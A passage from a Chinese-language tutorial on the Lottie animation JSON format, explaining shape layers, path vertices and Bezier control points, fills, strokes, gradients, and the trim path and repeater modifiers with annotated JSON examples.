<li><strong>关键帧定义状态</strong>：<code>k</code> 数组中的每个关键帧对象，通过 <code>t</code> (时间) 和 <code>s</code> (数值) 在时间轴上锚定了动画的各个“关键时刻”。</li>
<li><strong>缓动赋予灵魂</strong>：<code>i</code> (入缓动) 与 <code>o</code> (出缓动) 所定义的贝塞尔曲线，控制了数值变化的速率与节奏，是让动画摆脱机械感、获得生命力的关键。</li>
<li><strong>渲染器执行插值</strong>：在关键帧之间，Lottie 渲染器会依据缓动曲线，为每一帧<strong>实时计算</strong>出精确的属性值，从而创造出平滑的动画效果。</li>
</ul>
<p>您已经了解了从定义到渲染的完整链条。关于<strong>贝塞尔曲线的数学原理</strong>、<strong>多维属性的独立插值策略</strong>以及更复杂的<strong>表达式动画</strong>，都属于更深入的话题。掌握了本章的核心数据模型，您已经具备了自行解析绝大多数 Lottie 动画、并理解其运动逻辑的能力。</p>
<hr/>
<h2 data-id="heading-24"><strong>五、形状系统 - 矢量图形</strong></h2>
<p>在 Lottie 的六种基础图层中，<strong>形状图层（Shape Layer，<code>ty: 4</code>）</strong>  占据着独特而核心的地位。其他图层类型——如空对象图层（用于控制）、预合成图层（用于嵌套）、图像图层（静态位图）和文本图层（字形动画）——虽然在特定场景下不可或缺，但它们在数据结构和动画能力上相对简单。</p>
<p>形状图层（<code>ty: 4</code>）是 Lottie 实现复杂矢量动画的核心。与其他图层类型相比，它拥有最丰富的专有属性和最强的动画表现力。</p>
<h3 data-id="heading-25"><strong>形状图层的结构：<code>ty: 4</code> 与 <code>shapes</code> 数组</strong></h3>
<p>当一个图层的 <code>ty</code> 值为 <code>4</code> 时，它就是一个形状图层。其核心数据容器是 <strong><code>shapes</code></strong> 数组（在早期的 Lottie 版本中可能标记为 <code>it</code>）。该数组是一个<strong>有序的列表</strong>，定义了构成最终矢量图形的所有基础元素，例如路径、描边、填充等。</p>
<ul>
<li><strong>有序渲染与叠加</strong>：<code>shapes</code> 数组中的元素严格遵循<strong>数组索引顺序（从 <code>0</code> 到 <code>n-1</code>）进行渲染</strong>。在视觉上，这意味着<strong>索引值更大的元素（后渲染）会叠加在索引值更小的元素（先渲染）之上</strong>。例如，<code>shapes[2]</code> 会覆盖在 <code>shapes[0]</code> 和 <code>shapes[1]</code> 之上。这一规则是组织复杂图形层级的基础。</li>
<li><strong>元素类型</strong>：每个元素都是一个独立的对象，并通过 <code>ty</code> 字段来声明自己的类型（如 <code>gr</code> 表示组，<code>sh</code> 表示路径等）。</li>
</ul>
<h3 data-id="heading-26"><strong>四种基础形状类型速览</strong></h3>
<p><code>shapes</code> 数组中可以包含多种图形元素，其中基础形状主要有以下四种：</p>



































<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>名称</th><th>描述</th><th>核心动画属性</th></tr></thead><tbody><tr><td><strong><code>rc</code></strong></td><td><strong>矩形</strong></td><td>定义矩形或圆角矩形。</td><td><code>p</code> (位置), <code>s</code> (尺寸), <code>r</code> (圆角半径)</td></tr><tr><td><strong><code>el</code></strong></td><td><strong>椭圆</strong></td><td>定义圆形或椭圆形。</td><td><code>p</code> (中心点), <code>s</code> (半径/尺寸)</td></tr><tr><td><strong><code>sr</code></strong></td><td><strong>星形/多边形</strong></td><td>定义星形或多边形，可控制角数、内外径等。</td><td><code>p</code> (中心点), <code>ir</code>/<code>or</code> (内/外半径), <code>pt</code> (角数)</td></tr><tr><td><strong><code>sh</code></strong></td><td><strong>自由路径</strong></td><td>由贝塞尔曲线构成的任意形状路径，是矢量图形的基础。</td><td><code>ks</code> (路径数据，包含顶点与贝塞尔控制点)</td></tr></tbody></table>
<blockquote>
<p><strong>说明</strong>：<code>rc</code>, <code>el</code>, <code>sr</code> 本质上是参数化形状，它们会在导出时被转换为最终的 <code>sh</code>（路径）数据。但在 JSON 中，它们作为逻辑元素存在，便于理解和编辑。</p>
</blockquote>
<h3 data-id="heading-27"><strong>自由路径的核心：顶点与贝塞尔控制点</strong></h3>
<p>自由路径（<code>ty: ‘sh‘</code>）是最基础、最灵活的形状元素。其核心数据存储在 <code>ks</code> 属性中，它定义了一系列<strong>顶点（Vertex）</strong>  以及连接这些顶点的<strong>贝塞尔曲线</strong>。</p>
<p>一个路径的关键帧数据通常包含以下字段：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  “a”<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 表示路径数据是动画的</span>
  “k”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    “i”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 入控制点 (In Tangent)</span>
    “o”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 出控制点 (Out Tangent)</span>
    “v”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">50</span><span class="hljs-punctuation">,</span> <span class="hljs-number">50</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 顶点 (Vertex)</span>
    “c”<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 路径是否闭合 (Closed)</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>v</code> (顶点)</strong> ：一个二维数组，定义了路径在空间中经过的关键点坐标 <code>[x, y]</code>。</li>
<li><strong><code>i</code> (入控制点)</strong> ：定义曲线<strong>进入</strong>当前顶点时的方向与张力。</li>
<li><strong><code>o</code> (出控制点)</strong> ：定义曲线<strong>离开</strong>当前顶点时的方向与张力。</li>
<li><strong><code>c</code> (闭合)</strong> ：布尔值，<code>true</code> 表示路径的首尾顶点应连接，形成封闭图形。</li>
</ul>
<p><strong>工作原理</strong>：<code>v</code> 定义了“骨架”，<code>i</code> 和 <code>o</code> 则定义了连接骨架的“肌肉”曲线。通过为这些数据添加关键帧，即可实现路径的形变、绘制等复杂动画。</p>
<blockquote>
<p><strong>知识关联：两种贝塞尔曲线</strong><br/>
您可能已经发现，这里的 <code>i</code> 和 <code>o</code> 与第四章<strong>关键帧缓动</strong>中的 <code>i</code> 和 <code>o</code> 字段同名，且都代表贝塞尔曲线的控制点。这是 Lottie 中贝塞尔曲线的两种核心应用：</p>






























<table><thead><tr><th>维度</th><th><strong>空间贝塞尔曲线 (本章)</strong></th><th><strong>时间贝塞尔曲线 (第四章)</strong></th></tr></thead><tbody><tr><td><strong>作用</strong></td><td>定义<strong>空间中</strong>的图形<strong>形状</strong>。</td><td>定义<strong>时间上</strong>的属性<strong>变化速率</strong>（缓动）。</td></tr><tr><td><strong>控制点 (<code>i</code>/<code>o</code>)</strong></td><td>控制顶点处曲线的<strong>方向与曲率</strong>，决定路径形态。</td><td>控制关键帧处动画<strong>速度的快慢</strong>，决定运动节奏。</td></tr><tr><td><strong>坐标空间</strong></td><td>位于画布的<strong>二维/三维空间</strong> (如 <code>[x, y]</code>)。</td><td>位于<strong>时间-进度二维空间</strong>，X轴是时间(0-1)，Y轴是进度(0-1)。</td></tr><tr><td><strong>直观感受</strong></td><td>拖拽控制柄，改变的是<strong>线的弯曲程度</strong>。</td><td>拖拽控制柄，改变的是<strong>动画的先快后慢</strong>。</td></tr></tbody></table>
<p><strong>底层一致性</strong>：尽管应用不同，但两者都基于<strong>三次贝塞尔曲线</strong>的数学模型。理解这一点后，无论是调整路径平滑度还是动画缓动，您操作的都是同一种“控制点”逻辑。这也解释了为何可视化工具 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong> 对理解两者都有帮助：虽然它主要用于缓动（时间），但其对曲线形态的直观展示，同样有助于您想象空间路径中控制点对形状的影响。</p>
</blockquote>
<h3 data-id="heading-28"><strong>形状组（<code>gr</code>）：嵌套与组织</strong></h3>
<p>为了管理复杂的图形，Lottie 引入了 <strong>形状组（<code>ty: ‘gr‘</code>）</strong> 。组可以将多个形状元素（包括其他组）打包为一个逻辑整体。</p>
<ul>
<li>
<p><strong><code>it</code> 数组</strong>：组的核心属性，是一个数组，用于包含其子元素（如路径、填充、描边或其他组）。</p>
</li>
<li>
<p><strong>作用</strong>：</p>
<ol>
<li><strong>层次化管理</strong>：像文件夹一样组织图形，使结构清晰。</li>
<li><strong>统一变换</strong>：组可以拥有自己的 <code>ks</code>（变换）属性。对该组应用的变换（如移动、缩放）会同时影响其内部所有子元素。</li>
<li><strong>动画复用</strong>：通过控制组的变换，可以轻松实现整个图形模块的动画。</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-29"><strong>六、形状样式 - 填充与描边</strong></h2>
<p>在上一章中，我们探索了形状图层如何通过路径、椭圆、矩形等元素定义图形的<strong>几何骨架</strong>。然而，只有几何形状是“不可见”的。要让图形真正被渲染出来，就需要为其赋予<strong>样式</strong>。</p>
<p>本章将介绍形状系统中负责视觉呈现的两大核心样式元素：<strong>填充（Fill）</strong>  与<strong>描边（Stroke）</strong> 。它们为形状的<strong>内部</strong>和<strong>轮廓</strong>提供颜色、渐变和不透明度等视觉效果，是矢量图形从“线框”变为“画面”的关键。</p>
<h3 data-id="heading-30"><strong>6.1 样式的作用：让形状可见</strong></h3>
<p>在 <code>shapes</code> 数组中，样式元素（如 <code>fl</code>、<code>st</code>）与形状元素（如 <code>sh</code>、<code>el</code>）地位平等，通过<strong>渲染顺序</strong>相互结合。</p>
<ul>
<li><strong>堆叠规则</strong>：<code>it</code> 数组中的元素<strong>按索引顺序依次绘制</strong>。这意味着索引更大的元素（后绘制的）会叠加在索引更小的元素（先绘制的）之上。在图形构建中，通常先定义"形状"元素（如 <code>el</code>, <code>sh</code>），再定义为其着色的"样式"元素（如 <code>fl</code>, <code>st</code>）。</li>
<li><strong>独立性与组合性</strong>：样式元素是独立的，可以自由组合。一个形状可以同时拥有填充和描边，也可以只有其中一种。它们共同附着于其上方最近且未闭合的图形元素或组。</li>
</ul>
<h3 data-id="heading-31"><strong>填充（Fill）：纯色与渐变</strong></h3>
<p>填充用于为形状的内部区域着色。Lottie 支持两种填充类型。</p>
<h4 data-id="heading-32"><strong>纯色填充（<code>ty</code>: 'fl'）</strong></h4>
<p>这是最基础的填充类型，使用单一颜色。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fl"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Fill (纯色填充)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Color (颜色)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// RGBA 数组，值范围 0-1</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// Opacity (不透明度)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-33"><strong>渐变填充（<code>ty</code>: 'gf'）</strong></h4>
<p>Lottie 支持线性渐变和径向渐变，为填充带来丰富的色彩过渡。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"gf"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Gradient Fill (渐变填充)</span>
  <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// 渐变类型：1-线性，2-径向</span>
  <span class="hljs-attr">"g"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 起点 (线性) / 起始点 (径向)</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span>  <span class="hljs-comment">// 终点 (线性) / 结束点 (径向)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>g</code> 对象</strong>：是渐变的核心。<code>p</code> 定义色标数量，<code>k</code> 是一个扁平的数组，每 5 个数字为一组，表示一个色标的 <code>[位置, R, G, B, A]</code>。所有色标数据按顺序连接。</li>
</ul>
<h3 data-id="heading-34"><strong>描边（Stroke）：轮廓与样式</strong></h3>
<p>描边用于绘制形状的轮廓线。它拥有比填充更丰富的属性来控制线条的视觉表现。</p>
<h4 data-id="heading-35"><strong>纯色描边（<code>ty</code>: 'st'）</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"st"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Stroke (描边)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 颜色，同填充</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Width (线宽)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span>    <span class="hljs-comment">// 线宽为5像素</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"lc"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Cap (线帽): 1-平头, 2-圆头, 3-方头</span>
  <span class="hljs-attr">"lj"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Join (连接): 1-斜接, 2-圆角, 3-斜面</span>
  <span class="hljs-attr">"ml"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// Miter Limit (斜接限制)</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 不透明度</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>w</code> (Width)</strong> ：描边的粗细，支持动画。</li>
<li><strong><code>lc</code> (Line Cap)</strong> ：定义线段端点的样式。</li>
<li><strong><code>lj</code> (Line Join)</strong> ：定义线段转折处的连接样式。</li>
<li><strong><code>ml</code> (Miter Limit)</strong> ：当 <code>lj</code> 为 1 (斜接) 时，控制斜接长度与线宽的比例上限，防止尖角过长。</li>
</ul>
<h4 data-id="heading-36"><strong>渐变描边（<code>ty</code>: 'gs'）</strong></h4>
<p>渐变描边的数据结构与渐变填充 (<code>gf</code>) 高度相似，包含 <code>t</code> (类型)、<code>g</code> (渐变数据) 等属性，区别在于它应用于轮廓线而非填充区域。</p>
<h3 data-id="heading-37"><strong>样式的通用属性</strong></h3>
<p>填充和描边共享一些控制其最终呈现效果的通用属性：</p>




















<table><thead><tr><th>属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td><strong>不透明度 (Opacity)</strong> 。通过 <code>a</code> 和 <code>k</code> 控制，<strong>值范围为 0 到 100</strong>（100 为完全不透明）。这与 CSS 中 0-1 的范围不同，请注意区分。</td></tr><tr><td><strong><code>bm</code></strong></td><td><code>number</code></td><td><strong>混合模式 (Blend Mode)</strong> 。定义当前样式如何与下方已有的像素进行混合。常见值：<code>0</code> (正常)、<code>1</code> (相乘)、<code>2</code> (屏幕) 等，对应 After Effects 中的混合模式。</td></tr></tbody></table>
<h3 data-id="heading-38">🎨小试牛刀：画个圆</h3>
<p>现在，让我们综合运用以上概念，创建一个最简单的形状：<strong>一个蓝色的实心圆</strong>。我们将通过 JSON 配置，清晰地展示形状图层的 <code>shapes</code> 数组是如何组织起来的。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5733db6d3a25461f92ca58eb48742101~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=atYsH7mr0D%2BItQkxiTEoGqbKwpk%3D" alt="image.png" width="50%" loading="lazy"/></p>
<p>以下是实现该圆形的<strong>精简版 JSON 配置</strong>，我们省略了前面章节已详细讲解的通用图层属性（如 <code>ks</code> 变换），将焦点完全放在形状图层特有的 <code>shapes</code> 数组上：</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>, <span class="hljs-comment">// ⭐️ 核心标识：这是一个形状图层</span>
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"带描边圆形"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-comment">// 🔽 此处省略了图层的 `ks` 变换属性（如 p, a, s, r, o）</span>
      <span class="hljs-comment">// 在完整文件中，它们用于将整个图层定位在画布中心，例如：</span>
      <span class="hljs-comment">// "ks": { "p": { "a": 0, "k": [400, 300, 0] }, ... }</span>
      
      <span class="hljs-string">"shapes"</span>: [ <span class="hljs-comment">// ⭐️ 本章核心：形状与样式数组</span>
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>, <span class="hljs-comment">// 类型：gr (Group)，一个形状组</span>
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"圆形组"</span>,
          <span class="hljs-string">"it"</span>: [ <span class="hljs-comment">// 组内元素列表，按索引顺序 0→1→2→3 渲染</span>
            <span class="hljs-comment">// 1. 形状定义：椭圆 (el) - 先绘制，定义几何轮廓</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"椭圆路径"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] }, <span class="hljs-comment">// 位置：相对于组的中心</span>
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">100</span>, <span class="hljs-number">100</span>] } <span class="hljs-comment">// 尺寸：宽高100px，即圆形</span>
            },
            <span class="hljs-comment">// 2. 样式定义：填充 (fl) - 其次绘制，为形状内部着色</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"fl"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"蓝色填充"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// 颜色：RGBA，此为蓝色</span>
              },
              <span class="hljs-string">"o"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span> } <span class="hljs-comment">// 不透明度：100%</span>
            },
            <span class="hljs-comment">// 3. 样式定义：描边 (st) - 最后绘制，为形状轮廓添加边线</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"白色描边"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// 颜色：白色</span>
              },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">5</span> }, <span class="hljs-comment">// 线宽：5像素</span>
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 线帽：2 = 圆头</span>
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>  <span class="hljs-comment">// 连接：2 = 圆角</span>
            },
            <span class="hljs-comment">// 4. 必需的组变换 (tr) - 必须放在最后，控制整个组的变换</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"组变换"</span>
              <span class="hljs-comment">// 其内部属性 (p, a, s, r, o) 通常保持默认值 [0, 0, 100, 0, 100]</span>
            }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-39"><strong>七、形状修改器 - Trim、Repeater</strong></h2>
<p>在掌握了形状的构建与样式之后，我们迎来了形状系统的最后一块拼图：<strong>修改器（Modifiers）</strong> 。它们不是独立形状，而是<strong>附加在现有形状或组之上</strong>的“效果处理器”，能够以非破坏性的方式动态改变图形的外观或行为，是实现复杂、程式化动画的关键。</p>
<h3 data-id="heading-40"><strong>修改器的概念：作用范围与顺序</strong></h3>
<p>修改器是一种特殊类型的元素，其 <code>ty</code> 值定义在 <code>shapes</code> 或 <code>it</code> 数组中。它们<strong>不直接渲染</strong>，而是像一个处理器，<strong>作用于排列在它之前的特定元素</strong>。</p>
<ul>
<li><strong>作用逻辑</strong>：在 <code>it</code> 数组中，修改器按照<strong>从前往后</strong>的顺序执行，每个修改器会作用于它<strong>之前已定义</strong>的特定元素。例如，<code>Trim Path</code> 裁剪其之前的路径，<code>Repeater</code> 重复其之前的整个形状组合。</li>
<li><strong>顺序关键</strong>：修改器的<strong>位置</strong>决定了其作用范围和最终效果。例如，<code>[形状 → 样式 → Trim]</code> 会裁剪已着色的形状；而 <code>[形状 → Trim → 样式]</code> 会先裁剪路径，再为裁剪后的部分着色。</li>
</ul>
<h3 data-id="heading-41"><strong>Trim Path（<code>tm</code>）：路径裁剪动画</strong></h3>
<p><code>Trim Path</code>（路径裁剪）是最常用的修改器之一，它通过控制路径的“起止点”来创造<strong>笔触绘制、擦除、扫描</strong>等动画效果。</p>
<p><strong>核心属性：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tm"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Trim Paths</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Start（起点百分比）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 从0%到100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// End（终点百分比）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 保持100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offset（偏移）</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 范围0-360°，整体偏移裁剪区域</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>s</code> (Start)</strong> ：路径可见部分的<strong>起点</strong>，范围 0-100%。动画化此属性可实现“生长”动画。</li>
<li><strong><code>e</code> (End)</strong> ：路径可见部分的<strong>终点</strong>，范围 0-100%。通常 <code>e</code> &gt;= <code>s</code>。</li>
<li><strong><code>o</code> (Offset)</strong> ：<strong>裁剪区域的整体偏移量</strong>，范围 0-360°。它可以让裁剪的起止点沿路径循环移动，常用于创建“追逐”或“循环扫描”效果。</li>
</ul>
<p><strong>典型应用</strong>：通过动画 <code>s</code> 和 <code>e</code> 属性，可以实现经典的“笔画书写”或“进度条填充”效果。</p>
<h3 data-id="heading-42"><strong>Repeater（<code>rp</code>）：重复器</strong></h3>
<p><code>Repeater</code>（重复器）能将<strong>它之前的所有图形元素</strong>（包括形状、样式甚至其他修改器）复制多次，并对每个副本应用递增的变换，快速创建<strong>阵列、放射状、循环</strong>等复杂图案。</p>
<p><strong>核心属性：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
